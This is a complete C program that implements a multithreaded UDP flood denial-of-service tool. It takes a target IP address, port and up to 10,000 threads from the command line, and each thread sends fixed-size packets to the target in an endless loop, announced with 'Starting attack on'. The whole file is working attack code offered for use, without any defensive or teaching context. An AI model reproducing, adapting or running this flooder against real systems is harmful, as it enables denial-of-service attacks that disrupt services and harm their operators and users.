#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <sys/socket.h>
#include <time.h>

#define PACKET_SIZE 1024
#define MAX_THREADS 10000 

struct attack_params {
    char target_ip[16];
    int target_port;
    int packet_size;
};

void *udp_flood(void *arg) {
    struct attack_params *params = (struct attack_params *)arg;
    struct sockaddr_in target_addr;
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    
    if (sock < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(params->target_port);
    inet_pton(AF_INET, params->target_ip, &target_addr.sin_addr);

    char *packet = malloc(params->packet_size);
    memset(packet, 0x99, params->packet_size);

    while (1) {
        sendto(sock, packet, params->packet_size, 0, (struct sockaddr *)&target_addr, sizeof(target_addr));
    }

    free(packet);
    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        printf("Usage: %s <IP> <PORT> <THREADS>\n", argv[0]);
        return 1;
    }

    struct attack_params params;
    strncpy(params.target_ip, argv[1], sizeof(params.target_ip));
    params.target_port = atoi(argv[2]);
    params.packet_size = PACKET_SIZE;

    int threads = atoi(argv[3]);
    if (threads > MAX_THREADS) {
        threads = MAX_THREADS;
    }

    pthread_t thread_pool[threads];

    printf("Starting attack on %s:%d using %d threads...\n", params.target_ip, params.target_port, threads);
    
    for (int i = 0; i < threads; i++) {
        pthread_create(&thread_pool[i], NULL, udp_flood, &params);
        usleep(1000); 
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(thread_pool[i], NULL);
    }

    return 0;
}